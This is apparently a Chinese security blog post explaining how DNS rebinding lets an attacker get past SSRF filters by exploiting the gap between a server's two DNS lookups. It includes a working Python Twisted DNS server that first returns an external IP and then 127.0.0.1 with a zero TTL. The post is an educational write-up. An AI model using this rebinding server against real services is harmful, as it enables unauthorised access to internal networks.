---
title: DNS Rebinding Attack 绕过SSRF限制
tags: SSRF
---

### 0x00 一般SSRF过滤

SSRF过滤器的方式大致是以下几个步骤：

1.  获取到输入的URL，从该URL中提取Host
2.  对该Host进行DNS解析，获取到解析的IP
3.  检测该IP是否是合法的，比如是否是私有IP等
4.  如果IP检测为合法的，则进入curl的阶段发包

我们从DNS解析的角度看，该检测方式一共有两次，第一次是步骤2中对该host进行DNS解析，第二次是使用curl发包的时候进行解析。这两次DNS解析存在时间差，这就是利用的地方。

### 0x01 什么是TTL

时间差对应的DNS中的机制是`TTL`。
> `TTL`是英语Time-To-Live的简称，意思为一条域名解析记录在DNS服务器中的存留时间。当各地的DNS服务器接受到解析请求时，就会向域名指定的NS服务器发出解析请求从而获得解析记录；在获得这个记录之后，记录会在DNS服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是`TTL`值。

`TTL`表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。即请求了域名与iP的关系后，请求方会缓存这个关系，缓存保持的时间就是`TTL`。而缓存失效后就会删除，这时候如果重新访问域名指定的IP的话会重新建立匹配关系及cache。

### 0x02 攻击原理

在上面的过滤流程中，其实只有第一次的DNS解析是是否合法的检查，第二次是发起具体请求的DNS解析，如果在DNS第二次curl时进行解析的时候，我们能够更换URL对应的IP，同时当然要设置够短的`TTL`，那么在`TTL`之后、缓存失效之后，重新访问此URL，就能获取被更换后的IP。如果我们把第一次解析的IP设为合法IP，就能绕过Host合法性检查了；把第二次解析的IP设为内网IP，就达到了SSRF访问内网的目的。

**所以结论就是：DNS Rebinding Attack的原理是：利用服务器两次解析同一域名的短暂间隙，更换域名背后的IP达到突破一些防护限制进行SSRF攻击。**

### 0x03 实现方式

Bendawang 的文章总结了三种实现方法： 

1. 特定域名实现
2. 简单粗暴的两条A记录
3.  自建DNS服务器

了解详情可以点击：[原文链接](http://www.bendawang.site/2017/05/31/关于DNS-rebinding的总结/)

下面我来介绍一下相对来说最好用的方法，就是自建DNS服务器。

首先设置一个域名的A记录，假如IP为`233.233.233.233`，那我们就需要在这台服务器上开启DNS服务，

```python
from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server

record={}

class DynamicResolver(object):

    def _doDynamicResponse(self, query):
        name = query.name.name

        if name not in record or record[name]<1:
            ip="166.166.166.166"
        else:
            ip="127.0.0.1"

        if name not in record:
            record[name]=0
        record[name]+=1

        print name+" ===> "+ip

        answer = dns.RRHeader(
            name=name,
            type=dns.A,
            cls=dns.IN,
            ttl=0,
            payload=dns.Record_A(address=b'%s'%ip,ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional

    def query(self, query, timeout=None):
        return defer.succeed(self._doDynamicResponse(query))

def main():
    factory = server.DNSServerFactory(
        clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')]
    )

    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53, protocol)
    reactor.run()



if __name__ == '__main__':
    raise SystemExit(main())
```

这个脚本可以做到第一次请求时返回外网地址，也就是SSRF过滤中第一次安全检查可以成功通过，在第二次请求的时候，TTL为0，返回内网地址。（⚠️需要安装python的twisted库）

### 0x04 总结

在遇到特定情况的时候，这个方法还是值得一用的，本文并未实际搭建环境进行测试。实际情况需准备自己的域名进行搭建。

*最后，推荐一下Typora这个Markdown编辑器，很适合写作，再配合Picgo+Gitee作为图床写东西很方便*

<img src="https://gitee.com/evilashz/MyIMGs/raw/master/img/image-20200715145823789.png" alt="image-20200715145823789" style="zoom:67%;" />

------



### 参考

http://www.bendawang.site/2017/05/31/关于DNS-rebinding的总结

http://blog.leanote.com/post/snowming/e2c24cf057a4 

https://blog.csdn.net/u011721501/article/details/54667714